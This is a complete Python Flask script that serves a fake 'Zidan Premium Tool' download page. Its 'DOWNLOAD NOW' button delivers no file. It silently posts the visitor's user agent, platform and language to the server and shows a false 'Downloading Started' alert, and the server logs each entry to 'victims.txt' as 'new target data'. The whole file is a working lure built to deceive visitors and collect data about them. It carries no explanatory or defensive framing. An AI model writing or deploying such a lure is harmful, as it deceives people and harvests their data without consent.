from flask import Flask, request; import datetime; app = Flask(__name__)
@app.route('/')
def home():
    return '''<html><head><title>Zidan 10MB Tool</title><style>body{background:#111;color:#0f0;font-family:monospace;text-align:center;padding:50px;} .btn{background:#0f0;color:#000;padding:20px;text-decoration:none;font-weight:bold;border-radius:10px;cursor:pointer;}</style></head>
    <body><h1>🚀 Zidan Premium Tool (10MB)</h1><p>Click below to download your security tool.</p><br><br><a class='btn' onclick='send()'>DOWNLOAD NOW</a>
    <script>function send(){fetch('/data',{method:'POST',body:JSON.stringify({ua:navigator.userAgent,plat:navigator.platform,lang:navigator.language})}); alert('Downloading Started...');}</script></body></html>'''
@app.route('/data', methods=['POST'])
def data():
    log = f'[{datetime.datetime.now()}] DATA: {request.data.decode()}\n'
    with open('victims.txt', 'a') as f: f.write(log)
    print('\n' + '='*40 + '\n🔥 [!] NEW TARGET DATA RECEIVED! [!] 🔥\n' + '='*40)
    print(request.data.decode() + '\n' + '='*40)
    return 'OK'
app.run(host='0.0.0.0', port=8080)
